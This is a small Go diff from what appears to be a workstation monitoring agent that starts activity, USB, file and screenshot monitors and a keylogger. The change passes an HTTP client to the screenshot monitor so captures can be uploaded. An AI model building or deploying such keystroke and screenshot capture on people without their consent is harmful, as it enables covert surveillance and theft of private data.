@@ -124,7 +124,7 @@ func main() {
 	// Initialize all monitors
 	initActivityMonitor(ctx, cfg, httpClient, mgr.eventBuffer, mgr)
 	initUSBMonitor(cfg, mgr)
-	initScreenshotMonitor(cfg, mgr)
+	initScreenshotMonitor(cfg, httpClient, mgr)
 	initFileMonitor(cfg, mgr)
 	initKeylogger(cfg, mgr)
 
@@ -240,7 +240,7 @@ func initUSBMonitor(cfg *config.Config, mgr *monitorManager) {
 }
 
 // initScreenshotMonitor initializes screenshot capture
-func initScreenshotMonitor(cfg *config.Config, mgr *monitorManager) {
+func initScreenshotMonitor(cfg *config.Config, client *httpclient.Client, mgr *monitorManager) {
 	if !cfg.Screenshots.Enabled {
 		log.Println("Screenshot capture: DISABLED")
 		return
@@ -255,6 +255,7 @@ func initScreenshotMonitor(cfg *config.Config, mgr *monitorManager) {
 		cfg.Screenshots.MaxSizeKB,
 		cfg.Screenshots.CaptureOnlyActive,
 		cfg.Screenshots.UploadImmediately,
+		client,
 	)
 
 	if err := monitor.Start(); err != nil {
